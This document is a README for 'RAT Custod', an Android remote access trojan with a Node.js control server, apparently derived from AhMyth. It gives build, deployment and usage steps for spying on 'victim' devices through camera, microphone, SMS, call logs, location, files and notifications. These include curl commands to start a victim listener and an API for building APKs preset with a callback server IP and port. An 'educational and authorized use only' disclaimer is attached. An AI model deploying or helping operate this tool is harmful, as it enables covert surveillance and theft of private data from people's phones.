# RAT Custod - Remote Administration Tool

## Overview

RAT Custod is a remote administration tool consisting of an Android client and a Node.js server. The system allows remote management and monitoring of Android devices.

## Features

- Remote device management
- Socket.IO-based real-time communication
- Dynamic server configuration (NEW!)
- Notification monitoring
- File management
- Location tracking
- Camera and microphone access
- SMS and call log access
- Contact management

## Quick Start

### Server Setup

1. Navigate to the server directory:
   ```bash
   cd rat-Server
   ```

2. Install dependencies:
   ```bash
   npm install
   ```

3. Configure server settings in `config.json`:
   ```json
   {
     "SERVER_IP": "192.168.1.68",
     "SERVER_PORT": 8000
   }
   ```

4. Start the server:
   ```bash
   node server.js
   ```

   The server will start on port 3000 (configurable via PORT environment variable)

5. **IMPORTANT**: Start a victim listener for Android client connections:
   - Open the web UI at http://localhost:3000
   - Navigate to "Victims Lab"
   - Start a listener on port 8000 (or your configured SERVER_PORT)
   - Or use the API:
     ```bash
     curl -X POST http://localhost:3000/api/listen \
       -H "Content-Type: application/json" \
       -d '{"port": 8000}'
     ```

**Understanding the Port Architecture**:
- **Port 3000**: Main server (web UI, API endpoints, configuration)
- **Port 8000** (or configured): Victim listener for Android clients
- See [PORT_CONFIGURATION.md](PORT_CONFIGURATION.md) for detailed port setup and troubleshooting

### Client Setup

#### Prerequisites for Building

Before building the Android client, ensure you have:

1. **Java JDK 11** installed (JDK 8 also works, but JDK 11 is recommended)
   ```bash
   # Verify Java version
   java -version
   # Should show version 11.x or 1.8.x
   ```

2. **Android SDK** properly installed
   ```bash
   # Set environment variables (add to ~/.bashrc or ~/.zshrc)
   export ANDROID_HOME=/path/to/android/sdk
   export ANDROID_SDK_ROOT=/path/to/android/sdk
   ```

3. **Configure local.properties** (create if it doesn't exist)
   ```bash
   cd rat-Client
   echo "sdk.dir=/path/to/android/sdk" > local.properties
   ```

#### Building the APK

1. Navigate to the client directory:
   ```bash
   cd rat-Client
   ```

2. Ensure you're using the correct JDK:
   ```bash
   # Option 1: Set JAVA_HOME environment variable
   export JAVA_HOME=/path/to/jdk-11
   
   # Option 2: Configure in gradle.properties (already configured)
   # The gradle.properties file already sets org.gradle.java.home
   ```

3. Build the release APK:
   
   **Option A: Using the build script (Recommended)**
   ```bash
   ./build-apk.sh
   ```
   This script automatically detects and uses JDK 11.
   
   **Option B: Manual build with Gradle**
   ```bash
   export JAVA_HOME=/path/to/jdk-11
   ./gradlew assembleRelease
   ```

4. The built APK will be copied to `../Output/app.apk`

#### Installing the APK

1. Install on Android device:
   ```bash
   adb install path/to/app.apk
   ```

2. Grant required permissions when prompted

3. The client will automatically:
   - Fetch configuration from server at `http://<SERVER_IP>:3000/api/config`
   - Connect to the server using the configured IP and port
   - Start background service for remote management

## Dynamic Configuration

Starting with this version, the client supports **dynamic configuration**. This means you can change the server IP and port without rebuilding the APK.

### How It Works

1. The server hosts a `/api/config` endpoint that serves configuration
2. When the client starts, it fetches configuration from this endpoint
3. If the endpoint is unavailable, it falls back to the values in AndroidManifest.xml

### Changing Server Configuration

Simply edit `rat-Server/config.json`:

```json
{
  "SERVER_IP": "10.0.0.50",
  "SERVER_PORT": 9000
}
```

All new client connections will automatically use the updated configuration.

For detailed information, see [DYNAMIC_CONFIG.md](DYNAMIC_CONFIG.md)

## Building Custom APK

To build a custom APK with specific server configuration:

1. Use the server's build endpoint:
   ```bash
   POST /api/build
   Content-Type: application/json

   {
     "projectDir": "/path/to/rat-Client",
     "outputName": "custom-app",
     "keystorePath": "/path/to/keystore.jks",
     "keystorePassword": "password",
     "keyAlias": "key0",
     "keyPassword": "password",
     "serverIp": "192.168.1.68",
     "serverPort": 8000
   }
   ```

2. The built APK will be available in the `rat-Server/app/dist` folder

## Architecture

### Server (Node.js + Express + Socket.IO)

- **Main Server**: Runs on port 3000, serves UI and API endpoints
- **Dynamic Victim Listeners**: Creates separate Socket.IO servers for each connected device
- **Configuration API**: Serves dynamic configuration at `/api/config`
- **Build API**: Automates APK building with custom configurations

### Client (Android)

- **MainService**: Background service that manages the connection
- **IOSocket**: Handles Socket.IO communication with server
- **Managers**: Specialized modules for different device functions (Camera, Mic, SMS, etc.)
- **Dynamic Config**: Fetches configuration at startup from server

## Configuration Files

### Server Configuration

**File**: `rat-Server/config.json`
```json
{
  "SERVER_IP": "192.168.1.68",
  "SERVER_PORT": 8000
}
```

**Important Notes**:
- `SERVER_IP`: The IP address where your server is accessible to Android devices
- `SERVER_PORT`: The port where the victim listener runs (must be started separately)
- The main server always runs on port 3000 (or via PORT environment variable)
- The victim listener must be started manually via the web UI or `/api/listen` endpoint
- See [PORT_CONFIGURATION.md](PORT_CONFIGURATION.md) for complete port setup details

### Client Configuration (Fallback)

**File**: `rat-Client/app/src/main/AndroidManifest.xml`
```xml
<meta-data android:name="SERVER_IP"   android:value="192.168.1.68" />
<meta-data android:name="SERVER_PORT" android:value="8000" />
```

## API Endpoints

### Configuration Endpoint

**GET** `/api/config`

Returns current server configuration:
```json
{
  "SERVER_IP": "192.168.1.68",
  "SERVER_PORT": 8000
}
```

### Build Endpoint

**POST** `/api/build`

Builds a custom APK with specified configuration. See server documentation for details.

### Notifications Endpoint

**GET** `/api/notifications/:victim`

Returns notification history for a specific victim device.

## Development

### Prerequisites

- Node.js 14+ 
- Android SDK (for building client)
- **Java JDK 11** (Required - JDK 8 also compatible, JDK 17+ not supported)
- Gradle 7.0+

**Important**: The Android client build requires JDK 11 or JDK 8. Using JDK 17 or higher will result in build errors due to module encapsulation restrictions with the Android Gradle Plugin version used in this project.

### Project Structure

```
rat_custod/
├── rat-Server/         # Node.js server
│   ├── server.js       # Main server file
│   ├── config.json     # Dynamic configuration
│   ├── app/            # Server UI application
│   └── package.json    # Dependencies
├── rat-Client/         # Android client
│   ├── app/            # Android app source
│   │   └── src/main/
│   │       └── java/ahmyth/mine/king/ahmyth/
│   │           ├── MainService.java
│   │           ├── IOSocket.java
│   │           └── ... (other managers)
│   └── build.gradle    # Android build config
└── DYNAMIC_CONFIG.md   # Configuration documentation
```

## Security Notes

⚠️ **Important**: This tool is intended for educational and authorized use only.

- The `/api/config` endpoint is unauthenticated
- Communication uses cleartext HTTP (not HTTPS)
- Requires extensive Android permissions
- Should only be used on devices you own or have explicit permission to manage

## Troubleshooting

### Client can't connect to server

1. Verify main server is running: `curl http://<SERVER_IP>:3000/api/config`
2. **Verify victim listener is started**: Must be started via web UI or API (see below)
3. Check that SERVER_PORT in config.json matches the started listener port
4. Verify network connectivity between client and server
5. Verify firewall allows ports 3000 and configured SERVER_PORT (e.g., 8000)
6. Check Android logs: `adb logcat | grep AhMyth`

**Starting the victim listener**:
```bash
curl -X POST http://localhost:3000/api/listen \
  -H "Content-Type: application/json" \
  -d '{"port": 8000}'
```

For detailed troubleshooting, see [PORT_CONFIGURATION.md](PORT_CONFIGURATION.md)

### Config endpoint not responding

1. Verify `config.json` exists in rat-Server directory
2. Check JSON syntax is valid
3. Restart the server
4. Check server logs for errors

### APK build fails

1. **JDK Version Error**: If you see an error like `Unable to make field private final java.lang.String java.io.File.path accessible`, you're using an incompatible JDK version.
   - **Solution**: Use JDK 11 or JDK 8. Set `JAVA_HOME` environment variable or configure `org.gradle.java.home` in `rat-Client/gradle.properties`
   - Example: `export JAVA_HOME=/path/to/jdk-11` or add to gradle.properties: `org.gradle.java.home=/path/to/jdk-11`
2. Verify Android SDK is properly installed and `ANDROID_HOME` or `ANDROID_SDK_ROOT` is set
3. Check that `rat-Client/local.properties` points to the correct SDK location
4. Ensure all dependencies are installed
5. Review Gradle build logs for specific errors: `./gradlew assembleRelease --stacktrace --info`

## License

This project is for educational purposes only. Use responsibly and only on devices you own or have explicit permission to manage.

## Contributing

Contributions are welcome! Please ensure any changes:
- Maintain backward compatibility
- Include appropriate documentation
- Follow existing code style
- Are tested on both client and server

## Support

For issues and questions:
- Check the documentation in `DYNAMIC_CONFIG.md`
- Review existing issues on GitHub
- Create a new issue with detailed information about your problem
